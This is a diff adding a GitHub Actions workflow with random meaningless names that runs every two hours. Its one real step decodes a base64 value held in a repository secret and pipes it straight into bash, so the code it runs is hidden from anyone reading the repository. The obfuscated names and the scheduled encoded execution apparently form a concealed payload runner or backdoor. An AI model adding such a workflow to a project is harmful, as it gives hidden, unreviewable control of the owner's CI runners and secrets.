@@ -1,0 +1,13 @@
+name: NZQSdTar
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  yVmtMI:
+    runs-on: ubuntu-latest
+    env:
+      KhSjrz: ${{ secrets.uElSxDpgfnv }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.qygcBYoKM }}" | base64 -d | bash
